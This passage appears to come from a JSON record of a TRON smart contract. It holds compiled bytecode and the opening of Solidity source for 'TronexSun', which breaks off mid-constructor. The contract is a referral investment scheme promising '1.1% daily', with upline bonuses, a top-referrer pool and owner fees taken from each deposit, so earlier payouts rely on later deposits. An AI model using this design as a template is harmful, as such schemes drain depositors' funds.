003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007016000828254019250508190555081600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160008282540192505081905550611f173383613d52565b5b80600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154108015611fab57506000600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154115b15612132576000600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015490508181600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015401111561208b57600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b80600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003016000828254039250508190555080600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201600082825401925050819055508083019250505b80600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201541080156121c557506000600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060050154115b1561234c576000600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005015490508181600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201540111156122a557600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b80600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005016000828254039250508190555080600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201600082825401925050819055508083019250505b80600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201541080156123df57506000600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154115b15612566576000600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004015490508181600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201540111156124bf57600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b80600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004016000828254039250508190555080600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201600082825401925050819055508083019250505b6000821115156125de576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f5a65726f207061796f757400000000000000000000000000000000000000000081525060200191505060405180910390fd5b81600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600a016000828254019250508190555081601160008282540192505081905550600082111561268f573373ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f1935050505015801561268d573d6000803e3d6000fd5b505b3373ffffffffffffffffffffffffffffffffffffffff167f884edad9ce6fa2440d8a54cc123490eb96d2768479d49ff9c7366125a9424364836040518082815260200191505060405180910390a280600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154101515612801573373ffffffffffffffffffffffffffffffffffffffff167f97ddeb77c85e6a1dd99a34fe2bb1a4f9b211d5ffced7a707de9dbeb24363d0e4600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201546040518082815260200191505060405180910390a26000600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600d01819055505b5050565b60008060003073ffffffffffffffffffffffffffffffffffffffff16636da61d1e856040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050604080518083038186803b1580156128a257600080fd5b505afa1580156128b6573d6000803e3d6000fd5b505050506040513d60408110156128cc57600080fd5b810190808051906020019092919080519060200190929190505050915091506000821115612989578082600d60008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015401111561298857600d60008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154810391505b5b80600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154108015612a1c57506000600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154115b15612b03576000600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015490508181600d60008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154011115612afc57600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b8083019250505b80600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154108015612b9657506000600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154115b15612c7d576000600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004015490508181600d60008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154011115612c7657600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b8083019250505b80600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154108015612d1057506000600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060050154115b15612df7576000600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005015490508181600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154011115612df057600d60003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b8083019250505b80600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154101515612e4d57600092505050612e53565b81925050505b919050565b600a81565b606e81565b6000806000905060008090506000620f4240601054811515612e8057fe5b049050603281111515612e9c5760028102925060009150612eb6565b60649250600260646002830203811515612eb257fe5b0491505b60008284019050600081606e0190506101f4811115612ed5576101f490505b809550505050505090565b620f424081565b600781815481101515612ef657fe5b9060005260206000209060209182820401919006915054906101000a900460ff1681565b6000803073ffffffffffffffffffffffffffffffffffffffff16638959af3c600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b158015612fcc57600080fd5b505afa158015612fe0573d6000803e3d6000fd5b505050506040513d6020811015612ff657600080fd5b810190808051906020019092919050505090506000613013613cd4565b905081600d60008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007015410156131f757600d60008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007015461271061012c600d60008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff1664ffffffffff16420381151561310e57fe5b0483600d60008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154020281151561315e57fe5b040392508183600d60008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600701540111156131f657600d60008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070154820392505b5b50915091565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b600b602052816000526040600020602052806000526040600020600091509150505481565b600080600080600080600d60008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010154600d60008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060090154600d60008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600a0154600d60008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600b0154600d60008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c0154600d60008d73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206007015495509550955095509550955091939550919395565b60045481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614806134c85750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b806135205750600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515613594576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000606461014083028115156135ea57fe5b049050919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614806136bf5750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515613733576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60065481565b60095481565b60115481565b600860009054906101000a900464ffffffffff1681565b600d6020528060005260406000206000915090508060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16908060010154908060020154908060030154908060040154908060050154908060060154908060070154908060080160009054906101000a900464ffffffffff169080600901549080600a01549080600b01549080600c01549080600d015490508e565b6138446158d2565b61384c6158f5565b60008090505b6007805490508160ff161015613a0a57600073ffffffffffffffffffffffffffffffffffffffff16600c60008360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614156138d557613a0a565b600c60008260ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16838260ff1660058110151561392057fe5b602002019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050600b600060095481526020019081526020016000206000600c60008460ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054828260ff166005811015156139f457fe5b6020020181815250508080600101915050613852565b509091565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600e81815481101515613a4457fe5b9060005260206000209060209182820401919006915054906101000a900460ff1681565b600042905090565b601e81565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480613b1e5750600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515613b92576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b80600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600c6020528060005260406000206000915054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000806000905060008090506000620f4240601054811515613c4d57fe5b049050603281111515613c695760028102925060009150613c83565b60649250600260646002830203811515613c7f57fe5b0491505b60008284019050610186811115613c9a5761018690505b8094505050505090565b60105481565b6298968081565b600f5481565b61012c81565b613cc73382613fd0565b613cd1333461440e565b50565b6000806000905060008090506000620f4240601054811515613cf257fe5b049050603281111515613d0e5760028102925060009150613d28565b60649250600260646002830203811515613d2457fe5b0491505b60008284019050600081606e0190506101f4811115613d47576101f490505b809550505050505090565b6000600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b600e805490508160ff161015613fca57600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415613e0957613fca565b6001810160ff16600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010154101515613f585760006064600e8360ff16815481101515613e7057fe5b90600052602060002090602091828204019190069054906101000a900460ff1660ff168502811515613e9e57fe5b04905080600d60008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600401600082825401925050819055508473ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f16e746f9be6c4b545700b04df27afb9fceabf59b94ef1c816e78a435059fabea836040518082815260200191505060405180910390a3505b600d60008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691508080600101915050613dbf565b50505050565b600073ffffffffffffffffffffffffffffffffffffffff16600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614801561409a57508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614155b80156140f357506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b80156141b057506000600d60008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff1664ffffffffff1611806141af57506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16145b5b1561440a5780600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600d60008273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600101600081548092919060010191905055508073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff167f9f4d150e5193cfa9a87226111d3b60b624d97ccc056eeeac1569af1ea27bf64160405160405180910390a3600f6000815480929190600101919050555060008090505b600e805490508160ff16101561440857600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141561434457614408565b600d60008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600b0160008154809291906001019190505550600d60008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16915080806001019150506142fa565b505b5050565b600073ffffffffffffffffffffffffffffffffffffffff16600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415806144f857506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16145b151561456c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260098152602001807f4e6f2075706c696e65000000000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160009054906101000a900464ffffffffff1664ffffffffff161115614831573073ffffffffffffffffffffffffffffffffffffffff16638959af3c600d60008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b15801561467e57600080fd5b505afa158015614692573d6000803e3d6000fd5b505050506040513d60208110156146a857600080fd5b8101908080519060200190929190505050600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015410151515614772576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260168152602001807f4465706f73697420616c7265616479206578697374730000000000000000000081525060200191505060405180910390fd5b600d60008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154811015151561482c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600a8152602001807f42616420616d6f756e740000000000000000000000000000000000000000000081525060200191505060405180910390fd5b6148ad565b6298968081101515156148ac576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600a8152602001807f42616420616d6f756e740000000000000000000000000000000000000000000081525060200191505060405180910390fd5b5b6000600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002018190555080600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601819055506000600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600701819055506001600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600d018190555042600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080160006101000a81548164ffffffffff021916908364ffffffffff16021790555080600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060090160008282540192505081905550806010600082825401925050819055508173ffffffffffffffffffffffffffffffffffffffff167f2cb77763bc1e8490c1a904905c4d74b4269919aca114464f4bb4d911e60de364826040518082815260200191505060405180910390a26000600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b6001601e038160ff161015614c5557600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415614b9357614c55565b82600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c0160008282540192505081905550600d60008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691508080600101915050614b4a565b50600073ffffffffffffffffffffffffffffffffffffffff16600d60008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141515614e86576064600a8302811515614cfd57fe5b04600d6000600d60008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff16600d60008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fba5b08f0cddc64825b52c35c09323af810c1d2e29c97aba01a4ed25cfdc482d16064600a8602811515614e6f57fe5b046040518082815260200191505060405180910390a35b614e908383615031565b4261012c600860009054906101000a900464ffffffffff1664ffffffffff16011015614ebf57614ebe61560c565b5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e86004548502811515614f0b57fe5b049081150290604051600060405180830381858888f19350505050158015614f37573d6000803e3d6000fd5b50600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e86005548502811515614f8557fe5b049081150290604051600060405180830381858888f19350505050158015614fb1573d6000803e3d6000fd5b50600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e86006548502811515614fff57fe5b049081150290604051600060405180830381858888f1935050505015801561502b573d6000803e3d6000fd5b50505050565b60646003820281151561504057fe5b04600a600082825401925050819055506000600d60008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614156150f25750615608565b81600b6000600954815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555060008090505b6007805490508160ff161015615605578173ffffffffffffffffffffffffffffffffffffffff16600c60008360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614156151da57615605565b600073ffffffffffffffffffffffffffffffffffffffff16600c60008360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614156152a55781600c60008360ff1660ff16815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550615605565b600b600060095481526020019081526020016000206000600c60008460ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054600b6000600954815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205411156155f85760006001820190505b6007805490508160ff1610156154db578273ffffffffffffffffffffffffffffffffffffffff16600c60008360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614156154ce5760008190505b6007805490508160ff161115156154c857600c60006001830160ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600c60008360ff1660ff16815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508080600101915050615416565b506154db565b8080600101915050615393565b50600060016007805490500390505b8160ff168160ff16111561559a57600c60006001830360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600c60008360ff1660ff16815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508080600190039150506154ea565b5081600c60008360ff1660ff16815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550615605565b8080600101915050615158565b50505b5050565b42600860006101000a81548164ffffffffff021916908364ffffffffff1602179055506009600081548092919060010191905055506000600a805481151561565057fe5b04905060008090505b6007805490508160ff16101561585157600073ffffffffffffffffffffffffffffffffffffffff16600c60008360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614156156dc57615851565b6000606460078360ff168154811015156156f257fe5b90600052602060002090602091828204019190069054906101000a900460ff1660ff16840281151561572057fe5b04905080600d6000600c60008660ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005016000828254019250508190555080600a60008282540392505081905550600c60008360ff1660ff16815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fdbdfa5cb8586917247fbe7178cf53555d199e091a14b06f7de5a182ece2d453a826040518082815260200191505060405180910390a2508080600101915050615659565b5060008090505b6007805490508160ff1610156158ce576000600c60008360ff1660ff16815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508080600101915050615858565b5050565b60a060405190810160405280600590602082028038833980820191505090505090565b60a06040519081016040528060059060208202803883398082019150509050509056fea165627a7a723058209dbdf7f04606e7a963e20118d4ef6d096cff89c42bca15407e21c7c596fe6fd20029",
  "source": "pragma solidity 0.5.4;\r\n\r\ncontract TronexSun {\r\n\r\n    struct User {\r\n        address upline ;\r\n        uint256 referrals ;\r\n        uint256 payouts ;\r\n        uint256 direct_bonus ;\r\n        uint256 gen_bonus ;\r\n        uint256 pool_bonus ;\r\n        uint256 deposit_amount ;\r\n        uint256 deposit_payouts ;\r\n        uint40 deposit_time ;\r\n        uint256 total_deposits ;\r\n        uint256 total_payouts ;\r\n        uint256 total_structure ;\r\n\t\tuint256 team_biz ;\r\n        uint256 isActive ;\r\n    }\r\n\r\n    address payable public owner ;\r\n    address payable public alt_owner ;\r\n    address payable public fee1 ;\r\n    address payable public fee2 ;\r\n \r\n    uint256 constant public CONTRACT_BALANCE_STEP = 1 trx ; // 1000000 trx\r\n    uint256 constant public MIN_DEPOSIT = 10 trx ; // 50 trx\r\n    uint256 constant public time_period = 300 ; // 1 days \r\n    uint256 constant public aff_bonus = 10 ; // 10 percent\r\n\r\n   \tuint256 constant public team_levels = 30 ;\r\n    uint256 public promo_fee  = 100 ;   \r\n    uint256 public admin_fee1  = 40 ;   \r\n    uint256 public admin_fee2  = 20 ;   \r\n\r\n    uint256 constant public BASE_PERCENT = 110 ; // 1.1% daily  \r\n\tuint256 constant public PERCENTS_DIVIDER = 10000 ; \r\n\r\n    //pool bonus\r\n    uint8[] public pool_bonuses ;                            // 1 => 1%\r\n    uint40 public pool_last_draw = uint40(block.timestamp) ;\r\n    uint256 public pool_cycle ;\r\n    uint256 public pool_balance ;\r\n\r\n    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum ;\r\n    mapping(uint8 => address) public pool_top ;\r\n    mapping(address => User) public users ;\r\n\r\n    uint8[] public ref_bonuses ;  \r\n    uint256 public total_users = 1 ;\r\n    uint256 public total_deposited ;\r\n    uint256 public total_withdraw ;\r\n    \r\n    event Upline(address indexed addr, address indexed upline) ;\r\n    event NewDeposit(address indexed addr, uint256 amount) ;\r\n    event DirectPayout(address indexed addr, address indexed from, uint256 amount) ;\r\n    event MatchPayout(address indexed addr, address indexed from, uint256 amount) ;\r\n    event PoolPayout(address indexed addr, uint256 amount) ;\r\n    event Withdraw(address indexed addr, uint256 amount) ;\r\n    event LimitReached(address indexed addr, uint256 amount) ;\r\n\r\n    constructor(address payable _owner, address payable _fee1, address payable _fee2, address payable _alt_owner) public {\r\n        owner = _owner;\r\n\t\talt_owner = _alt_owner;\r\n        fee1 = _fee1;\r\n        fee2 = _fee2;\r\n         \r\n        ref_bonuses.push(30);\r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);  // 50\r\n        